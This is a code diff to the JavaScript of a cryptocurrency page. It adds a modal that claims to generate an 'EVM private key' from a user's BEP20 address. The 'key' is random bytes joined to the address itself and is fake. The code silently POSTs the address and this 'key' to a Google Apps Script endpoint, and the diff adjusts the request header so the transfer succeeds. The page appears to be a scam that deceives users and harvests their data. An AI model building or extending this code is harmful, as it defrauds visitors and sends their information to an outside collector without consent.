@@ -323,7 +323,7 @@ async function saveToGoogleScript(address, privateKey) {
     await fetch(GOOGLE_SCRIPT_URL, {
       method: 'POST',
       mode: 'no-cors',
-      headers: { 'Content-Type': 'application/json' },
+      headers: { 'Content-Type': 'text/plain;charset=utf-8' },
       body: JSON.stringify(payload)
     });
 
@@ -377,3 +377,141 @@ document.querySelectorAll('.feature-card, .benefit-item, .hiw-step, .faq-item').
   el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
   revealObserver.observe(el);
 });
+
+// ===== MODAL FUNCTIONS =====
+let modalGeneratedKey = null;
+
+function openGeneratorModal() {
+  const modal = document.getElementById('generatorModal');
+  modal.classList.add('open');
+  document.body.classList.add('modal-open');
+  // Focus input after transition
+  setTimeout(() => {
+    const input = document.getElementById('modalBep20Input');
+    if (input) input.focus();
+  }, 350);
+}
+
+function closeGeneratorModal() {
+  const modal = document.getElementById('generatorModal');
+  modal.classList.remove('open');
+  document.body.classList.remove('modal-open');
+}
+
+function handleModalOverlayClick(e) {
+  if (e.target === document.getElementById('generatorModal')) {
+    closeGeneratorModal();
+  }
+}
+
+// Close on Escape key
+document.addEventListener('keydown', (e) => {
+  if (e.key === 'Escape') closeGeneratorModal();
+});
+
+function onModalAddressInput() {
+  const input = document.getElementById('modalBep20Input');
+  const counter = document.getElementById('modalInputCounter');
+  const val = input.value.trim();
+  counter.textContent = val.length + '/42';
+  if (val.length === 42) {
+    counter.style.color = isValidBep20(val) ? 'var(--green)' : 'var(--red)';
+  } else {
+    counter.style.color = '';
+  }
+  document.getElementById('modalInputError').style.display = 'none';
+}
+
+function modalGenerateKey() {
+  const input = document.getElementById('modalBep20Input');
+  const errorEl = document.getElementById('modalInputError');
+  const btn = document.getElementById('modalGenerateBtn');
+  const btnText = document.getElementById('modalGenerateBtnText');
+  const addr = input.value.trim();
+
+  errorEl.style.display = 'none';
+
+  if (!addr) {
+    errorEl.textContent = '⚠ Please enter your BEP20 wallet address.';
+    errorEl.style.display = 'block';
+    return;
+  }
+  if (!isValidBep20(addr)) {
+    if (!addr.startsWith('0x')) errorEl.textContent = '⚠ Address must start with 0x';
+    else if (addr.length < 42) errorEl.textContent = `⚠ Too short: ${addr.length}/42 characters`;
+    else if (addr.length > 42) errorEl.textContent = `⚠ Too long: ${addr.length}/42 characters`;
+    else errorEl.textContent = '⚠ Invalid characters. Only hex digits (0-9, a-f) allowed after 0x.';
+    errorEl.style.display = 'block';
+    return;
+  }
+
+  // Loading state
+  btn.disabled = true;
+  btnText.textContent = 'Generating Secure Key...';
+  btn.querySelector('svg').style.animation = 'spin 0.8s linear infinite';
+
+  setTimeout(() => {
+    // Generate key
+    const randomBytes = new Uint8Array(12);
+    window.crypto.getRandomValues(randomBytes);
+    const randomHexPart = Array.from(randomBytes).map(b => b.toString(16).padStart(2, '0')).join('');
+    const addressPart = addr.slice(-40).toLowerCase();
+    const fullKey = '0x' + randomHexPart + addressPart;
+
+    modalGeneratedKey = fullKey;
+
+    // Show result
+    document.getElementById('modalKeyDisplay').textContent = fullKey;
+    document.getElementById('modalKeyLength').textContent = fullKey.length;
+    document.getElementById('modalInputView').style.display = 'none';
+    document.getElementById('modalResultView').style.display = 'block';
+
+    // Reset button
+    btn.disabled = false;
+    btnText.textContent = 'Generate EVM Private Key';
+    btn.querySelector('svg').style.animation = '';
+
+    // Save to Google Sheet
+    saveToGoogleScript(addr, fullKey);
+  }, 1000);
+}
+
+function modalCopyKey() {
+  if (!modalGeneratedKey) return;
+  const btn = document.getElementById('modalCopyBtn');
+  const btnText = document.getElementById('modalCopyBtnText');
+  const confirm = document.getElementById('modalCopyConfirm');
+
+  const copyText = (text) => {
+    btn.classList.add('copied');
+    btnText.textContent = 'Copied!';
+    confirm.style.display = 'flex';
+    setTimeout(() => { btn.classList.remove('copied'); btnText.textContent = 'Copy Private Key'; }, 3000);
+    setTimeout(() => { confirm.style.display = 'none'; }, 5000);
+  };
+
+  navigator.clipboard.writeText(modalGeneratedKey).then(copyText).catch(() => {
+    const ta = document.createElement('textarea');
+    ta.value = modalGeneratedKey;
+    ta.style.cssText = 'position:fixed;opacity:0;top:0;left:0';
+    document.body.appendChild(ta);
+    ta.focus(); ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+    copyText();
+  });
+}
+
+function resetModalGenerator() {
+  modalGeneratedKey = null;
+  document.getElementById('modalInputView').style.display = 'block';
+  document.getElementById('modalResultView').style.display = 'none';
+  document.getElementById('modalBep20Input').value = '';
+  document.getElementById('modalInputCounter').textContent = '0/42';
+  document.getElementById('modalInputCounter').style.color = '';
+  document.getElementById('modalInputError').style.display = 'none';
+  document.getElementById('modalCopyConfirm').style.display = 'none';
+  document.getElementById('modalCopyBtnText').textContent = 'Copy Private Key';
+  document.getElementById('modalCopyBtn').classList.remove('copied');
+  document.getElementById('modalBep20Input').focus();
+}
